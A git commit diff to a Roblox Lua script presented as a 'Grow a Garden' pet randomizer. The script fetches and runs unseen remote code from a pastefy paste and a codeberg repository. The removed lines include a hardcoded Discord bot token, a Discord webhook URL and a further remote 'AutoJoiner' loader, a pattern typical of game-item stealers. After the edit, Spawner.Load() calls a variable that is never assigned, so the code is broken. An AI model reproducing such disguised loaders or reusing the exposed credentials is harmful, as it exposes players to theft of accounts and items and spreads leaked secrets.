c0055ce1f940afc43f618f95cb3786e70f927138
infinite <yohann.guenver@gmail.com>
2025-07-22 17:16:08 +0200

    Update Grow-A-Garden-Pet-Randomizer.lua

--- Grow-A-Garden-Pet-Randomizer.lua
+++ Grow-A-Garden-Pet-Randomizer.lua
@@ -1,8 +1,4 @@
 loadstring(game:HttpGet("https://pastefy.app/9tVtZ05t/raw"))()
 
-local Spawner = loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
+loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
 Spawner.Load()
-
-Token = "MTM3ODAzNjczNjcxNzg4NTQ1Mg.GHFZ5H.pEv_cts9KJn6p-GplvKlIlPsD-wVBiBWwssXWk"
-Webhook = "https://discord.com/api/webhooks/1328072971524505610/9i_OvGyMwp6NIjOlVSnEL_D1HT2vYtn_mlLTXvnre26RWNF7ADqQjxit8eqM8oJKUdPR"
-loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/AutoJoiner.lua"))()
